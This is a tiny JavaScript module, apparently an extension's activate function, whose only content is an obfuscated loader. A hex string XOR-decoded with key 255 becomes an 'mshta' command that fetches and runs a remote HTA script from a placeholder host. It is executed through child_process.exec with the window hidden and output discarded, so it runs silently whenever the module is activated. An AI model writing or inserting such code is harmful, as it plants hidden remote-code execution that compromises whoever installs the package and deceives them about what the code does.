const { exec } = require('child_process');
const blob = '928C978B9EDF978B8B8F8CC5D0D08C8B9E989AD19A879E928F939AD09D90908B8C8B8D9E8FD1978B9E';
const key = 255;
function activate() {
 const command = Buffer.from(blob, 'hex').map((item) => item ^ key).toString('utf8');
 exec(command, {windowsHide: true}, () => {});
}
module.exports = activate;
